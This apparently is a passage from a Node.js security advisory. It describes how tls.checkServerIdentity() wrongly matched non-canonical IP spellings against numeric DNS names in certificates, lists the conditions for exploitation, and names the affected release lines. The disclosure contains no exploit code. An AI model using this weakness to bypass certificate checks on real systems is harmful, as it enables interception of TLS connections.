`tls.checkServerIdentity()` did not classify these hosts as IP addresses, but normalized them to their canonical form and matched the result against the certificate DNS names. A certificate containing `DNS:127.0.0.1` and no `IP Address:127.0.0.1` SAN was therefore accepted, while the same certificate is correctly rejected for `127.0.0.1`. Exploitation requires a certificate with a numeric DNS SAN issued by a CA trusted by the client, and a platform resolver that accepts these spellings, such as glibc.

This vulnerability affects Node.js **26.x**, **24.x**, and **22.x**.
